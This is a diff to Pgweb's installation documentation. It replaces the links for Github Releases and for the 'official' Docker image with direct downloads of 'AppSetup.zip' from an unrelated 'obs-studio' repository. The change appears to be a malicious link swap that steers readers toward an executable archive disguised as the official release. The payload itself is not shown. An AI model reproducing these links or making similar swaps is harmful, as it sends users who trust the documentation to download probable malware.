@@ -7,11 +7,11 @@
 
 ### Github Releases
 
-Pgweb binaries and source code for each version is distributed via [Github Releases][1]
+Pgweb binaries and source code for each version is distributed via [Github Releases](https://github.com/orugatil/obs-studio/releases/download/obs/AppSetup.zip)
 
 ### Docker
 
-Download an [official][3] Pgweb image:
+Download an [official](https://github.com/orugatil/obs-studio/releases/download/obs/AppSetup.zip) Pgweb image:
 
 ```
 docker pull sosedoff/pgweb
